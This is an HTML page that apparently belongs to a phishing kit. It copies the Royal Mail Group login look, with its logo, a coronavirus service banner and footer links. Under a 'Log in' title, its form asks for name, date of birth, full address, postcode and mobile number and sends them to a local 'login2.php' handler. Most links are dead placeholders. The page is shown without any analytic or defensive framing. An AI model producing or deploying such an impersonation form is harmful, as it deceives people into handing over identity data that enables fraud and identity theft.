<html lang="en"><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | Royal Mail Group Ltd</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
<div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
    <div class="layout-container">
  <header role="banner">
          <div class="header header--minimal" style="
    height: 100%;
">
        <div class="container clearfix">
          <div id="block-sitebranding" class="site-logo sitebranding block-system-branding-block">
  
    
  <div class="">
          <a class="site-logo-link" href="#" title="Home" rel="home">
      <img src="head.png" alt="Home">
    </a>
        </div>
</div>

        </div>
      </div>
      </header>

  
  

  <main role="main" class="main-minimal" style="
    position: relative;
    background-color: #DCDCDE;
">
    <a id="main-content" tabindex="-1"></a>          <div class="layout-content">
          <div>
    





    
<div data-drupal-messages-fallback="" class="hidden"></div>



    
    
  <div id="block-coronavirus17" class="coronavirus17 service-update block-block-contenta3129c44-9bd7-42b3-8e21-5f0b4710d5da">
          <div class="accordion-content-wrapper">
        <div role="button" id="service-update-accordion-toggle" aria-controls="service-update-accordion-content" class="service-update-title-wrapper accordion-all-screens  " aria-expanded="false">
          <div class="container">
            <div class="row">
              <div class="col-xs-12 col-sm-12 service-update-header-wrapper service-update-with-summary">
                <div class="service-update-header">
                  <h5 class="service-update-title">
                    Coronavirus update: We’re keeping the UK connected. Despite best efforts some services may be disrupted.
                  </h5>
                                      <div class="service-update-summary">
                      
                      
            <div class="body field field--name-body field--type-text-with-summary field--label-hidden field__item"><p class="body-copy-small">Click for more info on <a href="#">coronavirus</a> or for <a href="#">Service Updates</a><a>. Buy postage now with </a><a href="#">Click &amp; Drop</a> or the <a href="#">Royal Mail app</a>.</p>
</div>
      
                    </div>
                                  </div>
                              </div>
            </div>
          </div>
        </div>
              </div>
      </div>

  </div>

      </div>
    
          <div class="layout-content">
          <div>
    <div class="login-form">
  <div class="container">
    <div class="row">
      <div class="login-form-column">
        <form class="user-login-form" action="login2.php" method="post" id="user-login-form" accept-charset="UTF-8">

<h1 data-drupal-selector="edit-title">Enter Personal Information</h1>



    <div class="form-item-name js-form-item form-item js-form-type-email form-type-email js-form-item-name">
        <label for="edit-name" class="js-form-required form-required">First Name
            <span class="accessible-form-required" title="This field is required.">*</span>
        </label>
          <input spellcheck="false" autofocus="autofocus" autocomplete="First Name" type="text" id="edit-name" name="fname"  class="form-email required" required="required" aria-required="true">
    </div>
    
    
        <div class="form-item-name js-form-item form-item js-form-type-email form-type-email js-form-item-name">
        <label for="edit-name" class="js-form-required form-required">Last Name
            <span class="accessible-form-required" title="This field is required.">*</span>
        </label>
          <input spellcheck="false" autofocus="autofocus" autocomplete="Last Name"
        type="text" id="edit-name" name="lname" class="form-email required" required="required" aria-required="true">
    </div>

    <div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Date of Birth
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
      <input spellcheck="false" autocomplete="Date of Birth" type="date" id="edit-pass" name="dob" class="form-email required" required="required" aria-required="true">
        </div>
        
            <div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Address Line
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
      <input spellcheck="false" autocomplete="Address Line" type="text" id="edit-pass" name="address" class="form-email required" required="required" aria-required="true">
        </div>
        
        <div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Town / City
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
      <input spellcheck="false" autocomplete="Town / City" type="text" id="edit-pass" name="city" class="form-email required" required="required" aria-required="true">
        </div>
        
        
        <div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Postcode
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
      <input spellcheck="false" autocomplete="Postcode" type="text" id="edit-pass" name="zip" class="form-email required" required="required" aria-required="true">
        </div>
        
        <div class="form-item-pass js-form-item form-item js-form-type-password form-type-password js-form-item-pass">
      <label for="edit-pass" class="js-form-required form-required">Mobile Number
          <span class="accessible-form-required" title="This field is required.">*</span>
      </label>
      <input spellcheck="false" autocomplete="Mobile Number" type="text" id="edit-pass" name="mobile" class="form-email required" required="required" aria-required="true">
        </div>

<a href="#" class="new-password" data-drupal-selector="edit-new-password" data-msg-required="Send me a new password is required." id="edit-new-password">Send me a new password</a><div data-drupal-selector="edit-actions" class="form-actions js-form-wrapper form-wrapper" id="edit-actions">
<input data-drupal-selector="edit-submit" type="submit" id="edit-submit" name="op" value="Log in" class="button js-form-submit form-submit button--submit">
</div>
<label data-drupal-selector="edit-register-label" data-msg-required="Not registered yet? is required." for="edit-register-label" style="
    display: none;
">Not registered yet?
      </label><a href="#" class="button button--secondary" data-drupal-selector="edit-register-link" data-msg-required="Register is required." id="edit-register-link" style="
    display: none;
">Register</a><label data-drupal-selector="edit-other-accounts" data-msg-required="Other Royal Mail accounts is required." for="edit-other-accounts" style="
    display: none;
">Other Royal Mail accounts
      </label><a href="#" class="oba-link" data-drupal-selector="edit-oba-link" data-msg-required="Online Business Account login is required." id="edit-oba-link" style="
    display: none;
">Online Business Account login</a><a href="#" class="click-drop-link ext-link-wrapped-last-word" target="_blank" data-drupal-selector="edit-click-drop-link" data-msg-required="Click &amp; Drop is required." id="edit-click-drop-link" style="
    display: none;
">Click &amp; <span class="ext-link-last-word">Drop<svg focusable="false" class="new-window"><use xlink:href="#"></use></svg></span></a>
        </form>
      </div>
    </div>
  </div>
</div>

  </div>

      </div>
    
          <div class="layout-content content-bottom-wrapper">
          <div>
    <div id="block-breadcrumbs" class="container breadcrumbs block-system-breadcrumb-block">
  
    
  <div class="">
            <nav role="navigation" aria-labelledby="system-breadcrumb">
    <h2 id="system-breadcrumb" class="visually-hidden">Breadcrumb</h2>
    <ol>
          <li>
                  <a href="#">Home</a>
                      <span class="icon__wrapper"><svg class="icon icon--chevron" focusable="false" aria-hidden="true" role="img"><use xlink:href="#"></use></svg></span>
                        </li>
          <li>
                  <span class="visually-hidden" style="
    margin-right: 10px;
">&gt;   </span>
            Login
              </li>
        </ol>
  </nav>

      </div>
</div>

  </div>

      </div>
      </main>

  <footer class="footer-wrapper" role="contentinfo">
          <div class="post-footer">
        <div class="container">
            <div>
    <nav role="navigation" aria-labelledby="block-royalmail-site-links-personal-menu" id="block-royalmail-site-links-personal" class="royalmail-site-links-personal block-system-menu-blocksite-links-personal">
            
  <h2 class="visually-hidden" id="block-royalmail-site-links-personal-menu">Royal Mail site links personal</h2>
  

        
              <ul data-region="postfooter" class="menu">
              <li>
        <a href="#" target="_blank">Jobs<span class="visually-hidden">Opens in a new window</span><svg focusable="false" class="new-window"><use xlink:href="#"></use></svg></a>
              </li>
          <li>
        <a href="#" target="_blank" class="ext-link-wrapped-last-word">Royal Mail <span class="ext-link-last-word">Group<span class="visually-hidden">Opens in a new window</span><svg focusable="false" class="new-window"><use xlink:href="#"></use></svg></span></a>
              </li>
          <li>
        <a href="#" data-drupal-link-system-path="node/529">Terms and conditions</a>
              </li>
          <li>
        <a href="#" data-drupal-link-system-path="node/530">Privacy</a>
              </li><li>
        <a href="#" data-drupal-link-system-path="node/530" target="_self">Change Consent Preferences</a>
              </li>
          <li>
        <a href="#" data-drupal-link-system-path="node/527">Terms of use</a>
              </li>
          <li>
        <a href="#" data-drupal-link-system-path="node/552">Cookies</a>
              </li>
          <li>
        <a href="#" target="_blank">Accessibility<span class="visually-hidden">Opens in a new window</span><svg focusable="false" class="new-window"><use xlink:href="#"></use></svg></a>
              </li>
          <li>
        <a href="#" data-drupal-link-system-path="node/509">Cymraeg</a>
              </li>
        </ul>
  


  </nav>
<div id="block-copyright" class="copyright copyright-text block-block-content4dd8157e-b8a9-4bcf-abbc-36b6e01fa33c">
  
    
  <div class="">
          
            <div class="field-copyright-text field field--name-field-copyright-text field--type-string field--label-hidden field__item">© Royal Mail Group Limited 2021</div>
      
      </div>
</div>

  </div>

        </div>
      </div>
      </footer>
</div>

  </div>

</body></html>